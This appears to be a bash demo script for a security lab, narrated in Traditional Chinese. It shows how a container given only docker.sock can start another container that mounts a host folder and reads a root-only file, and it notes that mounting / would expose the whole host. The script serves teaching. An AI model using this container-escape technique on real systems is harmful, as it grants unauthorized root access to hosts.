. "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/env.sh"
cd $SEC_LAB/iso
say "主機上有一個只有 root 能讀的檔案（lab 假資料）"
runp 'ls -l $FENRIS_ROOT/lab/host_secret.txt; cat $FENRIS_ROOT/lab/host_secret.txt' 3
say "docker.sock：跟 Docker 背景程式講話的那個插座。它屬於 root"
runp 'ls -l /var/run/docker.sock' 2.5
say "模擬一個「管理面板」容器：它沒掛任何主機資料夾，只拿到 docker.sock"
runp "sudo docker run --rm -v /var/run/docker.sock:/var/run/docker.sock docker:cli docker run --rm -v \$FENRIS_ROOT/lab:/h alpine:3.22 cat /h/host_secret.txt" 5
say "它叫 Docker 再開一個容器，把主機資料夾掛進去——讀到了"
say "我只掛了 lab 資料夾；換成 / 就是整台主機。拿到 docker.sock = 拿到 root"
